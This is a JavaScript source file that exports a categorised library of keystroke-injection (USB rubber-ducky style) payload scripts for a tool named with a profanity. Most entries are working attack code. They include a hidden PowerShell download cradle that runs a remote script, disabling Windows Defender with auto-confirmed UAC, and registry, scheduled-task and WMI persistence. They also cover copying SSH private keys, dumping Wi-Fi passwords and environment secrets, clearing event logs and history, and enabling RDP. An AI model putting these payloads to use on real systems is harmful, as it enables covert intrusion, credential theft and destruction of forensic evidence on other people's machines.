export const PAYLOAD_CATEGORIES = [
  'Test & Debug',
  'Reconnaissance',
  'Injection',
  'Persistence',
  'Exfiltration',
  'Anti-Forensics',
  'Utilities',
]

export const PAYLOAD_LIBRARY = [

  /* ── Test & Debug ────────────────────────────────────────────────────── */
  {
    id: 'pl-t01',
    name: 'Hello World',
    category: 'Test & Debug',
    description: 'Opens Notepad and types a text. Ideal for validating the trigger.',
    os: ['windows'],
    script:
`DELAY 1000
GUI r
DELAY 400
STRING notepad
ENTER
DELAY 600
STRING === ThrustFucker ===
ENTER
STRING Payload active!
ENTER`,
  },
  {
    id: 'pl-t02',
    name: 'Keystroke Speed Test',
    category: 'Test & Debug',
    description: "Types the full alphabet to calibrate keystroke speed.",
    os: ['windows', 'linux', 'macos'],
    script:
`DELAY 500
STRING abcdefghijklmnopqrstuvwxyz
ENTER
STRING ABCDEFGHIJKLMNOPQRSTUVWXYZ
ENTER
STRING 0123456789 !@#$%^&*()
ENTER`,
  },
  {
    id: 'pl-t03',
    name: 'Popup MessageBox',
    category: 'Test & Debug',
    description: 'Displays a visible PowerShell MessageBox — immediate visual confirmation.',
    os: ['windows'],
    script:
`DELAY 800
GUI r
DELAY 400
STRING powershell -c "[System.Windows.Forms.MessageBox]::Show('ThrustFucker active!','ThrustFucker',[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Information)"
ENTER`,
  },

  /* ── Reconnaissance ──────────────────────────────────────────────────── */
  {
    id: 'pl-r01',
    name: 'Full Recon → File',
    category: 'Reconnaissance',
    description: 'whoami, hostname, ipconfig, netstat, tasklist, systeminfo → %PUBLIC%\\recon.txt',
    os: ['windows'],
    script:
`DELAY 1000
GUI r
DELAY 400
STRING powershell -w hidden -c "& {whoami;hostname;ipconfig /all;netstat -ano;tasklist;systeminfo} | Out-File $env:PUBLIC\\recon.txt -Force"
ENTER`,
  },
  {
    id: 'pl-r02',
    name: 'Quick Recon → Clipboard',
    category: 'Reconnaissance',
    description: 'whoami + hostname + local IP to clipboard in a single line.',
    os: ['windows'],
    script:
`DELAY 1000
GUI r
DELAY 400
STRING powershell -w hidden -c "\"$(whoami) | $(hostname) | $((ipconfig|sls 'IPv4').ToString().Trim())\" | Set-Clipboard"
ENTER`,
  },
  {
    id: 'pl-r03',
    name: 'Network Enumeration',
    category: 'Reconnaissance',
    description: 'ARP table, routes, network shares, active SMB sessions → net_recon.txt',
    os: ['windows'],
    script:
`DELAY 1000
GUI r
DELAY 400
STRING cmd /c "arp -a && route print && net share && net session" > %PUBLIC%\\net_recon.txt 2>&1
ENTER`,
  },
  {
    id: 'pl-r04',
    name: 'Users & Groups',
    category: 'Reconnaissance',
    description: 'Local accounts, local groups, active sessions.',
    os: ['windows'],
    script:
`DELAY 1000
GUI r
DELAY 400
STRING cmd /c "net user && net localgroup && query session" > %PUBLIC%\\users.txt 2>&1
ENTER`,
  },
  {
    id: 'pl-r05',
    name: 'Processes & Services',
    category: 'Reconnaissance',
    description: 'Snapshot of processes sorted by CPU and running services.',
    os: ['windows'],
    script:
`DELAY 1000
GUI r
DELAY 400
STRING powershell -w hidden -c "Get-Process|Sort CPU -Desc|Select Name,Id,CPU,@{n='Mem(MB)';e={[math]::Round($_.WS/1MB,1)}}|Out-File $env:PUBLIC\\proc.txt; Get-Service|Where Status -eq Running|Out-File $env:PUBLIC\\svc.txt -Append"
ENTER`,
  },

  /* ── Injection ───────────────────────────────────────────────────────── */
  {
    id: 'pl-i01',
    name: 'Win+R Template',
    category: 'Injection',
    description: "Minimal template: opens Win+R and runs a command. Replace COMMAND_HERE.",
    os: ['windows'],
    script:
`DELAY 1000
GUI r
DELAY 500
STRING COMMAND_HERE
ENTER`,
  },
  {
    id: 'pl-i02',
    name: 'PowerShell Windowed (Debug)',
    category: 'Injection',
    description: 'Opens PS in visible mode — useful for testing a script interactively.',
    os: ['windows'],
    script:
`DELAY 1000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 800
STRING Write-Host "ThrustFucker — ready" -ForegroundColor Green
ENTER`,
  },
  {
    id: 'pl-i03',
    name: 'Download Cradle',
    category: 'Injection',
    description: 'Downloads and executes a remote PowerShell script. Replace the URL.',
    os: ['windows'],
    script:
`DELAY 1000
GUI r
DELAY 400
STRING powershell -w hidden -c "iex(iwr 'https://YOUR-SERVER/payload.ps1' -UseBasicParsing).Content"
ENTER`,
  },
  {
    id: 'pl-i04',
    name: 'Disable Defender (Admin)',
    category: 'Injection',
    description: 'Disables Windows Defender Real-Time — requires UAC elevation.',
    os: ['windows'],
    script:
`DELAY 1000
GUI r
DELAY 400
STRING powershell -Command "Start-Process PowerShell -ArgumentList '-w hidden -c Set-MpPreference -DisableRealtimeMonitoring $true' -Verb RunAs"
ENTER
DELAY 2000
ALT y`,
  },

  /* ── Persistence ─────────────────────────────────────────────────────── */
  {
    id: 'pl-p01',
    name: 'Run Registry Key',
    category: 'Persistence',
    description: "HKCU\\Run entry — runs a payload on every login. Replace PAYLOAD_HERE.",
    os: ['windows'],
    script:
`DELAY 1000
GUI r
DELAY 400
STRING powershell -w hidden -c "Set-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' 'SvcUpdater' 'powershell -w hidden -c PAYLOAD_HERE'"
ENTER`,
  },
  {
    id: 'pl-p02',
    name: 'Scheduled Task',
    category: 'Persistence',
    description: 'Creates a schtasks task triggered on user login.',
    os: ['windows'],
    script:
`DELAY 1000
GUI r
DELAY 400
STRING powershell -w hidden -c "schtasks /create /tn 'SystemCheck' /tr 'powershell -w hidden -c PAYLOAD_HERE' /sc onlogon /f"
ENTER`,
  },
  {
    id: 'pl-p03',
    name: 'Startup Folder',
    category: 'Persistence',
    description: 'Drops a .bat file into the current user\'s Startup folder.',
    os: ['windows'],
    script:
`DELAY 1000
GUI r
DELAY 400
STRING powershell -w hidden -c "Set-Content \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.bat\" 'COMMAND_HERE'"
ENTER`,
  },
  {
    id: 'pl-p04',
    name: 'WMI Event Subscription',
    category: 'Persistence',
    description: 'Persistence via WMI — stealthier than registry, triggers on boot.',
    os: ['windows'],
    script:
`DELAY 1000
GUI r
DELAY 400
STRING powershell -w hidden -c "$f=[wmiclass]'root/cimv2:__EventFilter';$i=$f.CreateInstance();$i.QueryLanguage='WQL';$i.Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second=0\";$i.EventNamespace='root/cimv2';$i.Name='WinUpdate';$i.Put()"
ENTER`,
  },

  /* ── Exfiltration ────────────────────────────────────────────────────── */
  {
    id: 'pl-e01',
    name: 'SSH Keys → Clipboard',
    category: 'Exfiltration',
    description: 'Contents of ~/.ssh/id_rsa to clipboard. No network needed.',
    os: ['windows'],
    script:
`DELAY 1000
GUI r
DELAY 400
STRING powershell -w hidden -c "Get-Content $env:USERPROFILE\\.ssh\\id_rsa -EA 0 | Set-Clipboard"
ENTER`,
  },
  {
    id: 'pl-e02',
    name: 'Wi-Fi Passwords → File',
    category: 'Exfiltration',
    description: 'Dumps all Wi-Fi profiles with passwords in cleartext.',
    os: ['windows'],
    script:
`DELAY 1000
GUI r
DELAY 400
STRING cmd /c "for /f %i in ('netsh wlan show profiles^|findstr Profile') do netsh wlan show profile name=%i key=clear >> %PUBLIC%\\wifi.txt"
ENTER`,
  },
  {
    id: 'pl-e03',
    name: 'Env Variables → File',
    category: 'Exfiltration',
    description: 'Dumps environment variables (API tokens, paths, hardcoded credentials).',
    os: ['windows'],
    script:
`DELAY 1000
GUI r
DELAY 400
STRING powershell -w hidden -c "Get-ChildItem env: | Out-File $env:PUBLIC\\env_dump.txt"
ENTER`,
  },
  {
    id: 'pl-e04',
    name: 'Copy SSH Keys',
    category: 'Exfiltration',
    description: 'Copies ~/.ssh/* to %PUBLIC%\\ssh_keys for later retrieval.',
    os: ['windows'],
    script:
`DELAY 1000
GUI r
DELAY 400
STRING powershell -w hidden -c "New-Item $env:PUBLIC\\ssh_keys -ItemType Directory -EA 0; Copy-Item $env:USERPROFILE\\.ssh\\* $env:PUBLIC\\ssh_keys\\ -Force -EA 0"
ENTER`,
  },

  /* ── Anti-Forensics ──────────────────────────────────────────────────── */
  {
    id: 'pl-af01',
    name: 'Clear PS History',
    category: 'Anti-Forensics',
    description: 'Deletes PowerShell history (session + PSReadLine file).',
    os: ['windows'],
    script:
`DELAY 1000
GUI r
DELAY 400
STRING powershell -w hidden -c "Clear-History; Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -EA 0"
ENTER`,
  },
  {
    id: 'pl-af02',
    name: 'Clear Event Logs',
    category: 'Anti-Forensics',
    description: 'Clears all Windows event logs (System, Security, Application, etc.).',
    os: ['windows'],
    script:
`DELAY 1000
GUI r
DELAY 400
STRING powershell -w hidden -c "wevtutil el | ForEach-Object { try { wevtutil cl $_ } catch {} }"
ENTER`,
  },
  {
    id: 'pl-af03',
    name: 'Clean Prefetch + MRU',
    category: 'Anti-Forensics',
    description: 'Deletes Prefetch files and MRU entries from the registry.',
    os: ['windows'],
    script:
`DELAY 1000
GUI r
DELAY 400
STRING powershell -w hidden -c "Remove-Item $env:windir\\Prefetch\\*.pf -Force -EA 0; Remove-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name * -EA 0"
ENTER`,
  },

  /* ── Utilities ───────────────────────────────────────────────────────── */
  {
    id: 'pl-u01',
    name: 'Lock Session',
    category: 'Utilities',
    description: 'Immediately locks the Windows session (Win+L).',
    os: ['windows'],
    script:
`DELAY 200
GUI l`,
  },
  {
    id: 'pl-u02',
    name: 'Admin Terminal',
    category: 'Utilities',
    description: 'Launches PowerShell in Administrator mode (UAC auto-confirmed).',
    os: ['windows'],
    script:
`DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Start-Process PowerShell -Verb RunAs"
ENTER
DELAY 1500
ALT y`,
  },
  {
    id: 'pl-u03',
    name: 'Screenshot → File',
    category: 'Utilities',
    description: 'Captures the full screen and saves it to %PUBLIC%\\screenshot.png.',
    os: ['windows'],
    script:
`DELAY 1000
GUI r
DELAY 400
STRING powershell -w hidden -c "Add-Type -A System.Windows.Forms;$s=[System.Windows.Forms.Screen]::PrimaryScreen;$b=New-Object System.Drawing.Bitmap($s.Bounds.Width,$s.Bounds.Height);$g=[System.Drawing.Graphics]::FromImage($b);$g.CopyFromScreen($s.Bounds.Location,[System.Drawing.Point]::Empty,$s.Bounds.Size);$b.Save(\"$env:PUBLIC\\screenshot.png\")"
ENTER`,
  },
  {
    id: 'pl-u04',
    name: 'Enable RDP',
    category: 'Utilities',
    description: 'Enables Remote Desktop (port 3389) and opens the firewall.',
    os: ['windows'],
    script:
`DELAY 1000
GUI r
DELAY 400
STRING powershell -w hidden -c "Set-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' fDenyTSConnections 0; netsh advfirewall firewall set rule group='remote desktop' new enable=Yes"
ENTER`,
  },
]
